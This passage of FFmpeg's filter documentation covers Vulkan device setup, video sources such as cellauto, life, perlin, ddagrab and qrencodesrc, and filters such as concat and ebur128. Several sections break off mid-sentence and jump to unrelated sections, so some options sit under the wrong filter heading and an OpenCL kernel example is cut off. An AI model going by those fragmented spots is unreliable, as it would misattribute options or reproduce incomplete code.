at the cost of reducing information about out-of-range colors.

The default value is 0.5, and the algorithm here is a little different from
the cpu version tonemap currently. A setting of 0.0 disables this option.

`threshold`

The tonemapping algorithm parameters is fine-tuned per each scene. And a threshold
is used to detect whether the scene has changed or not. If the distance between
the current frame average brightness and the current running average exceeds
a threshold value, we would re-calculate scene average and peak brightness.
The default value is 0.2.

`format`

Currently supported formats are:

p010
nv12

`range, r`

Set the output color range.

* First Source image, \_\_read\_only image2d\_t.
  Second Source image, \_\_read\_only image2d\_t.

  These are the most recent images on each input. The kernel may read from
  them to generate the output, but they can’t be written to.

## [14 Vulkan Video Filters](#toc-Vulkan-Video-Filters)

Below is a description of the currently available Vulkan video filters.

To enable compilation of these filters you need to configure FFmpeg with
`--enable-vulkan` and either `--enable-libglslang` or `--enable-libshaderc`.

Running Vulkan filters requires you to initialize a hardware device and to pass that device to all filters in any filter graph.

`-init_hw_device vulkan[=name][:device[,key=value...]]`

Initialise a new hardware device of type vulkan called name, using the
given device parameters and options in key=value. The following options
are supported:

`debug`

Switches validation layers on if set to 1.

`linear_images`

Allocates linear images. Does not apply to decoding.

`disable_multiplane`

Disables multiplane images. Does not apply to decoding.

`-filter_hw_device name`

Pass the hardware device called name to all filters in any filter graph.

For more detailed information see <https://www.ffmpeg.org/ffmpeg.html#Advanced-Video-options>

* Example of choosing the first device and running nlmeans\_vulkan filter with default parameters on it.
  ```
  -init_hw_device vulkan=vk:0 -filter_hw_device vk -i INPUT -vf "hwupload,nlmeans_vulkan,hwdownload" OUTPUT

  ```

As Vulkan filters are not able to access frame data in normal memory, all frame data needs to be uploaded ([hwupload](#hwupload)) to hardware surfaces connected to the appropriate device before being used and then downloaded ([hwdownload](#hwdownload)) back to normal memory. Note that [hwupload](#hwupload) will upload to a frame with the same layout as the software frame, so it may be necessary to add a [format](#format) filter immediately before to get the input into the right format and [hwdownload](#hwdownload) does not support all formats on the output - it is usually necessary to insert an additional [format](#format) filter immediately following in the graph to get the output in a supported format.

### [14.1 avgblur\_vulkan](#toc-avgblur_005fvulkan)

```

`grid`

See [xstack](#xstack).

`grid_tile_size`

Set output size for each input stream when `grid` is set. If this option
is not set, this filter will set output size by default to the size of the
first input stream. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

`fill`

See [xstack](#xstack).

## [16 Video Sources](#toc-Video-Sources)

Below is a description of the currently available video sources.

### [16.1 buffer](#toc-buffer)

Buffer video frames, and make them available to the filter chain.

This source is mainly intended for a programmatic use, in particular
through the interface defined in `libavfilter/buffersrc.h`.

It accepts the following parameters:

`video_size`

Specify the size (width and height) of the buffered video frames. For the
syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

`width`

The input video width.

`height`

The input video height.

`pix_fmt`

A string representing the pixel format of the buffered video frames.
It may be a number corresponding to a pixel format, or a pixel format
name.

`time_base`

Specify the timebase assumed by the timestamps of the buffered frames.

`frame_rate`

Specify the frame rate expected for the video stream.

`colorspace`

A string representing the color space of the buffered video frames.
It may be a number corresponding to a color space, or a color space
name.

`range`

A string representing the color range of the buffered video frames.
It may be a number corresponding to a color range, or a color range
name.

`pixel_aspect, sar`

The sample (pixel) aspect ratio of the input video.

`hw_frames_ctx`

When using a hardware pixel format, this should be a reference to an
AVHWFramesContext describing input frames.

For example:

```
buffer=width=320:height=240:pix_fmt=yuv410p:time_base=1/24:sar=1

```

will instruct the source to accept video frames with size 320x240 and
with format "yuv410p", assuming 1/24 as the timestamps timebase and
square pixels (1:1 sample aspect ratio).
Since the pixel format with name "yuv410p" corresponds to the number 6
(check the enum AVPixelFormat definition in `libavutil/pixfmt.h`),
this example corresponds to:

```
buffer=size=320x240:pixfmt=6:time_base=1/24:pixel_aspect=1/1

```

Alternatively, the options can be specified as a flat string, but this
syntax is deprecated:

width:height:pix\_fmt:time\_base.num:time\_base.den:pixel\_aspect.num:pixel\_aspect.den

### [16.2 cellauto](#toc-cellauto)

Create a pattern generated by an elementary cellular automaton.

The initial state of the cellular automaton can be defined through the
`filename` and `pattern` options. If such options are
not specified an initial state is created randomly.

At each new frame a new row in the video is filled with the result of
the cellular automaton next generation. The behavior when the whole
frame is filled is defined by the `scroll` option.

This source accepts the following options:

`filename, f`

Read the initial cellular automaton state, i.e. the starting row, from
the specified file.
In the file, each non-whitespace character is considered an alive
cell, a newline will terminate the row, and further characters in the
file will be ignored.

`pattern, p`

Read the initial cellular automaton state, i.e. the starting row, from
the specified string.

Each non-whitespace character in the string is considered an alive
cell, a newline will terminate the row, and further characters in the
string will be ignored.

`rate, r`

Set the video rate, that is the number of frames generated per second.
Default is 25.

`random_fill_ratio, ratio`

Set the random fill ratio for the initial cellular automaton row. It
is a floating point number value ranging from 0 to 1, defaults to
1/PHI.

This option is ignored when a file or a pattern is specified.

`random_seed, seed`

Set the seed for filling randomly the initial row, must be an integer
included between 0 and UINT32\_MAX. If not specified, or if explicitly
set to -1, the filter will try to use a good random seed on a best
effort basis.

`rule`

Set the cellular automaton rule, it is a number ranging from 0 to 255.
Default value is 110.

`size, s`

Set the size of the output video. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

If `filename` or `pattern` is specified, the size is set
by default to the width of the specified initial state row, and the
height is set to width \* PHI.

If `size` is set, it must contain the width of the specified
pattern string, and the specified pattern will be centered in the
larger row.

If a filename or a pattern string is not specified, the size value
defaults to "320x518" (used for a randomly generated initial state).

`scroll`

If set to 1, scroll the output upward when all the rows in the output
have been already filled. If set to 0, the new generated row will be
written over the top row just after the bottom row is filled.
Defaults to 1.

`start_full, full`

If set to 1, completely fill the output with generated rows before
outputting the first frame.
This is the default behavior, for disabling set the value to 0.

`stitch`

If set to 1, stitch the left and right row edges together.
This is the default behavior, for disabling set the value to 0.

#### [16.2.1 Examples](#toc-Examples-151)

* Read the initial state from `pattern`, and specify an output of
  size 200x400.
  ```
  cellauto=f=pattern:s=200x400

  ```
* Generate a random initial row with a width of 200 cells, with a fill
  ratio of 2/3:
  ```
  cellauto=ratio=2/3:s=200x200

  ```
* Create a pattern generated by rule 18 starting by a single alive cell
  centered on an initial row with width 100:
  ```
  cellauto=p=@:s=100x400:full=0:rule=18

  ```
* Specify a more elaborated initial pattern:
  ```
  cellauto=p='@@ @ @@':s=100x400:full=0:rule=18

  ```

### [16.3 coreimagesrc](#toc-coreimagesrc-1)

Video source generated on GPU using Apple’s CoreImage API on OSX.

This video source is a specialized version of the [coreimage](#coreimage) video filter.
Use a core image generator at the beginning of the applied filterchain to
generate the content.

The coreimagesrc video source accepts the following options:

`list_generators`

List all available generators along with all their respective options as well as
possible minimum and maximum values along with the default values.

```
list_generators=true

```

`size, s`

Specify the size of the sourced video. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).
The default value is `320x240`.

`rate, r`

Specify the frame rate of the sourced video, as the number of frames
generated per second. It has to be a string in the format
frame\_rate\_num/frame\_rate\_den, an integer number, a floating point
number or a valid video frame rate abbreviation. The default value is
"25".

`sar`

Set the sample aspect ratio of the sourced video.

`duration, d`

Set the duration of the sourced video. See
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax.

If not specified, or the expressed duration is negative, the video is
supposed to be generated forever.

Additionally, all options of the [coreimage](#coreimage) video filter are accepted.
A complete filterchain can be used for further processing of the
generated input without CPU-HOST transfer. See [coreimage](#coreimage) documentation
and examples for details.

#### [16.3.1 Examples](#toc-Examples-152)

* Use CIQRCodeGenerator to create a QR code for the FFmpeg homepage,
  given as complete and escaped command-line for Apple’s standard bash shell:
  ```
  ffmpeg -f lavfi -i coreimagesrc=s=100x100:filter=CIQRCodeGenerator@inputMessage=https\\\\\://FFmpeg.org/@inputCorrectionLevel=H -frames:v 1 QRCode.png

  ```

  This example is equivalent to the QRCode example of [coreimage](#coreimage) without the
  need for a nullsrc video source.

### [16.4 ddagrab](#toc-ddagrab)

Captures the Windows Desktop via Desktop Duplication API.

The filter exclusively returns D3D11 Hardware Frames, for on-gpu encoding
or processing. So an explicit [hwdownload](#hwdownload) is needed for any kind of
software processing.

It accepts the following options:

`output_idx`

DXGI Output Index to capture.

Usually corresponds to the index Windows has given the screen minus one,
so it’s starting at 0.

Defaults to output 0.

`draw_mouse`

Whether to draw the mouse cursor.

Defaults to true.

Only affects hardware cursors. If a game or application renders its own cursor,
it’ll always be captured.

`framerate`

Maximum framerate at which the desktop will be captured - the interval between
successive frames will not be smaller than the inverse of the framerate. When
dup\_frames is true (the default) and the desktop is not being updated
often enough, the filter will duplicate a previous frame. Note that there is no
background buffering going on, so when the filter is not polled often enough
then the actual inter-frame interval may be significantly larger.

Defaults to 30 FPS.

`video_size`

Specify the size of the captured video.

Defaults to the full size of the screen.

Cropped from the bottom/right if smaller than screen size.

`offset_x`

Horizontal offset of the captured video.

`offset_y`

Vertical offset of the captured video.

`output_fmt`

Desired filter output format.
Defaults to 8 Bit BGRA.

It accepts the following values:

‘`auto`’

Passes all supported output formats to DDA and returns what DDA decides to use.

‘`8bit`’
‘`bgra`’

8 Bit formats always work, and DDA will convert to them if necessary.

‘`10bit`’
‘`x2bgr10`’

Filter initialization will fail if 10 bit format is requested but unavailable.

`dup_frames`

When this option is set to true (the default), the filter will duplicate frames
when the desktop has not been updated in order to maintain approximately
constant target framerate. When this option is set to false, the filter will
wait for the desktop to be updated (inter-frame intervals may vary significantly
in this case).

#### [16.4.1 Examples](#toc-Examples-153)

Capture primary screen and encode using nvenc:

```
ffmpeg -f lavfi -i ddagrab -c:v h264_nvenc -cq 18 output.mp4

```

You can also skip the lavfi device and directly use the filter.
Also demonstrates downloading the frame and encoding with libx264.
Explicit output format specification is required in this case:

```
ffmpeg -filter_complex ddagrab=output_idx=1:framerate=60,hwdownload,format=bgra -c:v libx264 -crf 18 output.mp4

```

If you want to capture only a subsection of the desktop, this can be achieved
by specifying a smaller size and its offsets into the screen:

```
ddagrab=video_size=800x600:offset_x=100:offset_y=100

```

### [16.5 gradients](#toc-gradients)

This source is useful in particular for testing encoding features.

This source accepts the following options:

`rate, r`

Specify the frame rate of the sourced video, as the number of frames
generated per second. It has to be a string in the format
frame\_rate\_num/frame\_rate\_den, an integer number, a floating point
number or a valid video frame rate abbreviation. The default value is
"25".

`duration, d`

### [16.8 frei0r\_src](#toc-frei0r_005fsrc)

Provide a frei0r source.

To enable compilation of this filter you need to install the frei0r
header and configure FFmpeg with `--enable-frei0r`.

This source accepts the following parameters:

`size`

The size of the video to generate. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

`framerate`

The framerate of the generated video. It may be a string of the form
num/den or a frame rate abbreviation.

`filter_name`

The name to the frei0r source to load. For more information regarding frei0r and
how to set the parameters, read the [frei0r](#frei0r) section in the video filters
documentation.

`filter_params`

A ’|’-separated list of parameters to pass to the frei0r source.

For example, to generate a frei0r partik0l source with size 200x200
and frame rate 10 which is overlaid on the overlay filter main input:

```
frei0r_src=size=200x200:framerate=10:filter_name=partik0l:filter_params=1234 [overlay]; [in][overlay] overlay

```

### [16.9 life](#toc-life)

Generate a life pattern.

This source is based on a generalization of John Conway’s life game.

The sourced input represents a life grid, each pixel represents a cell
which can be in one of two possible states, alive or dead. Every cell
interacts with its eight neighbours, which are the cells that are
horizontally, vertically, or diagonally adjacent.

At each interaction the grid evolves according to the adopted rule,
which specifies the number of neighbor alive cells which will make a
cell stay alive or born. The `rule` option allows one to specify
the rule to adopt.

This source accepts the following options:

`filename, f`

Set the file from which to read the initial grid state. In the file,
each non-whitespace character is considered an alive cell, and newline
is used to delimit the end of each row.

If this option is not specified, the initial grid is generated
randomly.

`rate, r`

Set the video rate, that is the number of frames generated per second.
Default is 25.

`random_fill_ratio, ratio`

Set the random fill ratio for the initial random grid. It is a
floating point number value ranging from 0 to 1, defaults to 1/PHI.
It is ignored when a file is specified.

`random_seed, seed`

Set the seed for filling the initial random grid, must be an integer
included between 0 and UINT32\_MAX. If not specified, or if explicitly
set to -1, the filter will try to use a good random seed on a best
effort basis.

`rule`

Set the life rule.

A rule can be specified with a code of the kind "SNS/BNB",
where NS and NB are sequences of numbers in the range 0-8,
NS specifies the number of alive neighbor cells which make a
live cell stay alive, and NB the number of alive neighbor cells
which make a dead cell to become alive (i.e. to "born").
"s" and "b" can be used in place of "S" and "B", respectively.

Alternatively a rule can be specified by an 18-bits integer. The 9
high order bits are used to encode the next cell state if it is alive
for each number of neighbor alive cells, the low order bits specify
the rule for "borning" new cells. Higher order bits encode for an
higher number of neighbor cells.
For example the number 6153 = `(12<<9)+9` specifies a stay alive
rule of 12 and a born rule of 9, which corresponds to "S23/B03".

Default value is "S23/B3", which is the original Conway’s game of life
rule, and will keep a cell alive if it has 2 or 3 neighbor alive
cells, and will born a new cell if there are three alive cells around
a dead cell.

`size, s`

Set the size of the output video. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

If `filename` is specified, the size is set by default to the
same size of the input file. If `size` is set, it must contain
the size specified in the input file, and the initial grid defined in
that file is centered in the larger resulting area.

If a filename is not specified, the size value defaults to "320x240"
(used for a randomly generated initial grid).

`stitch`

If set to 1, stitch the left and right grid edges together, and the
top and bottom edges also. Defaults to 1.

`mold`

Set cell mold speed. If set, a dead cell will go from `death_color` to
`mold_color` with a step of `mold`. `mold` can have a
value from 0 to 255.

`life_color`

Set the color of living (or new born) cells.

`death_color`

Set the color of dead cells. If `mold` is set, this is the first color
used to represent a dead cell.

`mold_color`

Set mold color, for definitely dead and moldy cells.

For the syntax of these 3 color options, check the [(ffmpeg-utils)"Color" section in the
ffmpeg-utils manual](ffmpeg-utils.html#color-syntax).

#### [16.9.1 Examples](#toc-Examples-154)

* Read a grid from `pattern`, and center it on a grid of size
  300x300 pixels:
  ```
  life=f=pattern:s=300x300

  ```
* Generate a random grid of size 200x200, with a fill ratio of 2/3:
  ```
  life=ratio=2/3:s=200x200

  ```
* Specify a custom rule for evolving a randomly generated grid:
  ```
  life=rule=S14/B34

  ```
* Full example with slow death effect (mold) using `ffplay`:
  ```
  ffplay -f lavfi life=s=300x200:mold=10:r=60:ratio=0.1:death_color=#C83232:life_color=#00ff00,scale=1200:800:flags=16

  ```

### [16.10 perlin](#toc-perlin)

Generate Perlin noise.

Perlin noise is a kind of noise with local continuity in space. This
can be used to generate patterns with continuity in space and time,
e.g. to simulate smoke, fluids, or terrain.

In case more than one octave is specified through the `octaves`
option, Perlin noise is generated as a sum of components, each one
with doubled frequency. In this case the `persistence` option
specify the ratio of the amplitude with respect to the previous
component. More octave components enable to specify more high
frequency details in the generated noise (e.g. small size variations
due to boulders in a generated terrain).

#### [16.10.1 Options](#toc-Options-6)

`size, s`

Specify the size (width and height) of the buffered video frames. For the
syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).
Default value is `320x240`.

`rate, r`

Specify the frame rate expected for the video stream, expressed as a
number of frames per second. Default value is `25`.

`octaves`

Specify the total number of components making up the noise, each one
with doubled frequency. Default value is `1`.

`persistence`

Set the ratio used to compute the amplitude of the next octave
component with respect to the previous component amplitude. Default
value is `1`.

`xscale`
`yscale`

Define a scale factor used to multiple the x, y coordinates. This can
be useful to define an effect with a pattern stretched along the x or
y axis. Default value is `1`.

`tscale`

Define a scale factor used to multiple the time coordinate. This can
be useful to change the time variation speed. Default value is `1`.

`random_mode`

Set random mode used to compute initial pattern.

Supported values are:

`random`

Compute and use random seed.

`ken`

Use the predefined initial pattern defined by Ken Perlin in the
original article, can be useful to compare the output with other
sources.

`seed`

Use the value specified by `random_seed` option.

Default value is `random`.

`random_seed, seed`

When `random_mode` is set to random\_seed, use this value
to compute the initial pattern. Default value is `0`.

#### [16.10.2 Examples](#toc-Examples-155)

* Generate single component:
  ```
  perlin

  ```
* Use Perlin noise with 7 components, each one with a halved contribution
  to total amplitude:
  ```
  perlin=octaves=7:persistence=0.5

  ```
* Chain Perlin noise with the [lutyuv](#lutyuv) to generate a black&white
  effect:
  ```
  perlin=octaves=3:tscale=0.3,lutyuv=y='if(lt(val\,128)\,255\,0)'

  ```
* Stretch noise along the y axis, and convert gray level to red-only
  signal:
  ```
  perlin=octaves=7:tscale=0.4:yscale=0.3,lutrgb=r=val:b=0:g=0

  ```

### [16.11 qrencodesrc](#toc-qrencodesrc)

Generate a QR code using the libqrencode library (see
<https://fukuchi.org/works/qrencode/>).

To enable the compilation of this source, you need to configure FFmpeg with
`--enable-libqrencode`.

The QR code is generated from the provided text or text pattern. The
corresponding QR code is scaled and put in the video output according to the
specified output size options.

In case no text is specified, the QR code is not generated, but an empty colored
output is returned instead.

This source accepts the following options:

`qrcode_width, q`
`padded_qrcode_width, Q`

Specify an expression for the width of the rendered QR code, with and without
padding. The qrcode\_width expression can reference the value set by the
padded\_qrcode\_width expression, and vice versa.
By default padded\_qrcode\_width is set to qrcode\_width, meaning that
there is no padding.

These expressions are evaluated only once, when initializing the source.
See the [qrencode Expressions](#qrencode_005fexpressions) section for details.

Note that some of the constants are missing for the source (for example the
x or t or Â¸n), since they only makes sense when evaluating the
expression for each frame rather than at initialization time.

`rate, r`

Specify the frame rate of the sourced video, as the number of frames
generated per second. It has to be a string in the format
frame\_rate\_num/frame\_rate\_den, an integer number, a floating point
number or a valid video frame rate abbreviation. The default value is
"25".

`case_sensitive, cs`

Instruct libqrencode to use case sensitive encoding. This is enabled by
default. This can be disabled to reduce the QR encoding size.

`level, l`

Specify the QR encoding error correction level. With an higher correction level,
the encoding size will increase but the code will be more robust to corruption.
Lower level is L.

It accepts the following values:

‘`L`’
‘`M`’
‘`Q`’
‘`H`’

`expansion`

Select how the input text is expanded. Can be either `none`, or
`normal` (default). See the [qrencode Text expansion](#qrencode_005ftext_005fexpansion)
section for details.

`text`
`textfile`

Define the text to be rendered. In case neither is specified, no QR is encoded
(just an empty colored frame).

In case expansion is enabled, the text is treated as a text template, using the
qrencode expansion mechanism. See the [qrencode
Text expansion](#qrencode_005ftext_005fexpansion) section for details.

`background_color, bc`
`foreground_color, fc`

Set the QR code and background color. The default value of
foreground\_color is "black", the default value of background\_color
is "white".

For the syntax of the color options, check the [(ffmpeg-utils)"Color"
section in the ffmpeg-utils manual](ffmpeg-utils.html#color-syntax).

#### [16.11.1 Examples](#toc-Examples-156)

* Generate a QR code encoding the specified text with the default size:
  ```
  qrencodesrc=text=www.ffmpeg.org

  ```
* Same as below, but select blue on pink colors:
  ```
  qrencodesrc=text=www.ffmpeg.org:bc=pink:fc=blue

  ```
* Generate a QR code with width of 200 pixels and padding, making the padded width
  4/3 of the QR code width:
  ```
  qrencodesrc=text=www.ffmpeg.org:q=200:Q=4/3*q

  ```
* Generate a QR code with padded width of 200 pixels and padding, making the QR
  code width 3/4 of the padded width:
  ```
  qrencodesrc=text=www.ffmpeg.org:Q=200:q=3/4*Q

  ```
* Generate a QR code encoding the frame number:
  ```
  qrencodesrc=text=%{n}

  ```
* Generate a QR code encoding the GMT timestamp:
  ```
  qrencodesrc=text=%{gmtime}

  ```
* Generate a QR code encoding the timestamp expressed as a float:
  ```
  qrencodesrc=text=%{pts}

  ```

the SMPTE Engineering Guideline EG 1-1990.

The `smptehdbars` source generates a color bars pattern, based on
the SMPTE RP 219-2002.

The `testsrc` source generates a test video pattern, showing a
color pattern, a scrolling gradient and a timestamp. This is mainly
intended for testing purposes.

The `testsrc2` source is similar to testsrc, but supports more
pixel formats instead of just `rgb24`. This allows using it as an
input for other tests without requiring a format conversion.

The `yuvtestsrc` source generates an YUV test pattern. You should
see a y, cb and cr stripe from top to bottom.

The sources accept the following parameters:

`level`

Specify the level of the Hald CLUT, only available in the `haldclutsrc`
source. A level of `N` generates a picture of `N*N*N` by `N*N*N`
pixels to be used as identity matrix for 3D lookup tables. Each component is
coded on a `1/(N*N)` scale.

`color, c`

Specify the color of the source, only available in the `color`
source. For the syntax of this option, check the
[(ffmpeg-utils)"Color" section in the ffmpeg-utils manual](ffmpeg-utils.html#color-syntax).

`size, s`

Specify the size of the sourced video. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).
The default value is `320x240`.

This option is not available with the `allrgb`, `allyuv`, and
`haldclutsrc` filters.

`rate, r`

Specify the frame rate of the sourced video, as the number of frames
generated per second. It has to be a string in the format
frame\_rate\_num/frame\_rate\_den, an integer number, a floating point
number or a valid video frame rate abbreviation. The default value is
"25".

`duration, d`

Set the duration of the sourced video. See
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax.

If not specified, or the expressed duration is negative, the video is
supposed to be generated forever.

Since the frame rate is used as time base, all frames including the last one
will have their full duration. If the specified duration is not a multiple
of the frame duration, it will be rounded up.

`sar`

Set the sample aspect ratio of the sourced video.

`alpha`

Specify the alpha (opacity) of the background, only available in the
`testsrc2` source. The value must be between 0 (fully transparent) and
255 (fully opaque, the default).

`decimals, n`

Set the number of decimals to show in the timestamp, only available in the
`testsrc` source.

The displayed timestamp value will correspond to the original
timestamp value multiplied by the power of 10 of the specified
value. Default value is 0.

`type`

Set the type of the color spectrum, only available in the
`colorspectrum` source. Can be one of the following:

‘`black`’
‘`white`’
‘`all`’

`patch_size`

Set patch size of single color patch, only available in the
`colorchart` source. Default is `64x64`.

`preset`

Set colorchecker colors preset, only available in the
`colorchart` source.

Available values are:

‘`reference`’
‘`skintones`’

Default value is `reference`.

#### [16.12.1 Examples](#toc-Examples-157)

* Generate a video with a duration of 5.3 seconds, with size
  176x144 and a frame rate of 10 frames per second:
  ```

  with an opacity of 0.2, with size "qcif" and a frame rate of 10
  frames per second:
  ```
  color=c=red@0.2:s=qcif:r=10

  ```
* If the input content is to be ignored, `nullsrc` can be used. The

      val.xy = val.zw = convert_float2(loc) / convert_float2(get_image_dim(dst));

      write_imagef(dst, loc, val);
  }

  ```
* Generate a Sierpinski carpet pattern, panning by a single pixel each frame.
  ```
  __kernel void sierpinski_carpet(__write_only image2d_t dst,
                                  unsigned int index)
  {
      int2 loc = (int2)(get_global_id(0), get_global_id(1));

      float4 value = 0.0f;
      int x = loc.x + index;
      int y = loc.y + index;
      while (x > 0 || y > 0) {

  ```

### [18.7 avectorscope](#toc-avectorscope)

Convert input audio to a video output, representing the audio vector
scope.

The filter is used to measure the difference between channels of stereo
audio stream. A monaural signal, consisting of identical left and right
signal, results in straight vertical line. Any stereo separation is visible
as a deviation from this line, creating a Lissajous figure.

#### [18.7.2 Commands](#toc-Commands-160)

This filter supports the all above options as commands except options `size` and `rate`.

### [18.8 bench, abench](#toc-bench_002c-abench)

Benchmark part of a filtergraph.

The filter accepts the following options:

`action`

Start or stop a timer.

Available values are:

‘`start`’

Get the current time, set it as frame metadata (using the key
`lavfi.bench.start_time`), and forward the frame to the next filter.

‘`stop`’

Get the current time and fetch the `lavfi.bench.start_time` metadata from
the input frame metadata to get the time difference. Time difference, average,
maximum and minimum time (respectively `t`, `avg`, `max` and
`min`) are then printed. The timestamps are expressed in seconds.

#### [18.8.1 Examples](#toc-Examples-161)

* Benchmark [selectivecolor](#selectivecolor) filter:
  ```
  bench=start,selectivecolor=reds=-.2 .12 -.49,bench=stop

  ```

### [18.9 concat](#toc-concat)

Concatenate audio and video streams, joining them together one after the
other.

The filter works on segments of synchronized video and audio streams. All
segments must have the same number of streams of each type, and that will
also be the number of streams at output.

The filter accepts the following options:

`n`

Set the number of segments. Default is 2.

`v`

Set the number of output video streams, that is also the number of video
streams in each segment. Default is 1.

`a`

Set the number of output audio streams, that is also the number of audio
streams in each segment. Default is 0.

`unsafe`

Activate unsafe mode: do not fail if segments have a different format.

The filter has v+a outputs: first v video outputs, then
a audio outputs.

There are nx(v+a) inputs: first the inputs for the first
segment, in the same order as the outputs, then the inputs for the second
segment, etc.

Related streams do not always have exactly the same duration, for various
reasons including codec frame size or sloppy authoring. For that reason,
related synchronized streams (e.g. a video and its audio track) should be
concatenated at once. The concat filter will use the duration of the longest
stream in each segment (except the last one), and if necessary pad shorter
audio streams with silence.

For this filter to work correctly, all segments must start at timestamp 0.

All corresponding streams must have the same parameters in all segments; the
filtering system will automatically select a common pixel format for video
streams, and a common sample format, sample rate and channel layout for
audio streams, but other settings, such as resolution, must be converted
explicitly by the user.

Different frame rates are acceptable but will result in variable frame rate
at output; be sure to configure the output file to handle it.

#### [18.9.1 Examples](#toc-Examples-162)

* Concatenate an opening, an episode and an ending, all in bilingual version
  (video in stream 0, audio in streams 1 and 2):
  ```
  ffmpeg -i opening.mkv -i episode.mkv -i ending.mkv -filter_complex \
    '[0:0] [0:1] [0:2] [1:0] [1:1] [1:2] [2:0] [2:1] [2:2]
     concat=n=3:v=1:a=2 [v] [a1] [a2]' \
    -map '[v]' -map '[a1]' -map '[a2]' output.mkv

  ```
* Concatenate two parts, handling audio and video separately, using the
  (a)movie sources, and adjusting the resolution:
  ```
  movie=part1.mp4, scale=512:288 [v1] ; amovie=part1.mp4 [a1] ;
  movie=part2.mp4, scale=512:288 [v2] ; amovie=part2.mp4 [a2] ;
  [v1] [v2] concat [outv] ; [a1] [a2] concat=v=0:a=1 [outa]

  ```

  Note that a desync will happen at the stitch if the audio and video streams
  do not have exactly the same duration in the first file.

#### [18.9.2 Commands](#toc-Commands-161)

This filter supports the following commands:

`next`

Close the current segment and step to the next one

### [18.10 ebur128](#toc-ebur128-1)

EBU R128 scanner filter. This filter takes an audio stream and analyzes its loudness
level. By default, it logs a message at a frequency of 10Hz with the
Momentary loudness (identified by `M`), Short-term loudness (`S`),
Integrated loudness (`I`) and Loudness Range (`LRA`).

The filter can only analyze streams which have
sample format is double-precision floating point. The input stream will be converted to
this specification, if needed. Users may need to insert aformat and/or aresample filters
after this filter to obtain the original parameters.

The filter also has a video output (see the video option) with a real
time graph to observe the loudness evolution. The graphic contains the logged
message mentioned above, so it is not printed anymore when this option is set,
unless the verbose logging is set. The main graphing area contains the
short-term loudness (3 seconds of analysis), and the gauge on the right is for
the momentary loudness (400 milliseconds), but can optionally be configured
to instead display short-term loudness (see gauge).

The green area marks a +/- 1LU target range around the target loudness
(-23LUFS by default, unless modified through target).

More information about the Loudness Recommendation EBU R128 on
<http://tech.ebu.ch/loudness>.

The filter accepts the following options:

`video`

Activate the video output. The audio stream is passed unchanged whether this
option is set or no. The video stream will be the first output stream if
activated. Default is `0`.

`size`

Set the video size. This option is for video only. For the syntax of this
option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).
Default and minimum resolution is `640x480`.

`meter`

Set the EBU scale meter. Default is `9`. Common values are `9` and
`18`, respectively for EBU scale meter +9 and EBU scale meter +18. Any
other integer value between this range is allowed.

`metadata`

Set metadata injection. If set to `1`, the audio input will be segmented
into 100ms output frames, each of them containing various loudness information
in metadata. All the metadata keys are prefixed with `lavfi.r128.`.

Default is `0`.

`framelog`

Force the frame logging level.

Available values are:

‘`quiet`’

logging disabled

‘`info`’

information logging level

‘`verbose`’

verbose logging level

By default, the logging level is set to info. If the `video` or
the `metadata` options are set, it switches to verbose.

`peak`

Set peak mode(s).

Available modes can be cumulated (the option is a `flag` type). Possible
values are:

‘`none`’

Disable any peak mode (default).

‘`sample`’

Enable sample-peak mode.

Simple peak mode looking for the higher sample value. It logs a message
for sample-peak (identified by `SPK`).

‘`true`’

Enable true-peak mode.

If enabled, the peak lookup is done on an over-sampled version of the input
stream for better peak accuracy. It logs a message for true-peak.
(identified by `TPK`) and true-peak per frame (identified by `FTPK`).
This mode requires a build with `libswresample`.

`dualmono`

Treat mono input files as "dual mono". If a mono file is intended for playback
on a stereo system, its EBU R128 measurement will be perceptually incorrect.
If set to `true`, this option will compensate for this effect.
Multi-channel input files are not affected by this option.

`panlaw`

Set a specific pan law to be used for the measurement of dual mono files.
This parameter is optional, and has a default value of -3.01dB.

`target`

Set a specific target level (in LUFS) used as relative zero in the visualization.
This parameter is optional and has a default value of -23LUFS as specified
by EBU R128. However, material published online may prefer a level of -16LUFS
(e.g. for use with podcasts or video platforms).

`gauge`

Set the value displayed by the gauge. Valid values are `momentary` and s
`shortterm`. By default the momentary value will be used, but in certain
scenarios it may be more useful to observe the short term value instead (e.g.
live mixing).

`scale`

Sets the display scale for the loudness. Valid parameters are `absolute`
(in LUFS) or `relative` (LU) relative to the target. This only affects the
video output, not the summary or continuous log output.

`integrated`

Read-only exported value for measured integrated loudness, in LUFS.

`range`

Read-only exported value for measured loudness range, in LU.

`lra_low`

Read-only exported value for measured LRA low, in LUFS.

`lra_high`

Read-only exported value for measured LRA high, in LUFS.

`sample_peak`

Read-only exported value for measured sample peak, in dBFS.

`true_peak`

Read-only exported value for measured true peak, in dBFS.

#### [18.10.1 Examples](#toc-Examples-163)

* Real-time graph using `ffplay`, with a EBU scale meter +18:
  ```
  ffplay -f lavfi -i "amovie=input.mp3,ebur128=video=1:meter=18 [out0][out1]"

  ```
* Run an analysis with `ffmpeg`:
  ```
  ffmpeg -nostats -i input.mp3 -filter_complex ebur128 -f null -

  ```

### [18.11 interleave, ainterleave](#toc-interleave_002c-ainterleave)

Temporally interleave frames from several inputs.

`interleave` works with video inputs, `ainterleave` with audio.

These filters read frames from several inputs and send the oldest
queued frame to the output.

Input streams must have well defined, monotonically increasing frame
timestamp values.

In order to submit one frame to output, these filters need to enqueue
at least one frame for each input, so they cannot work in case one
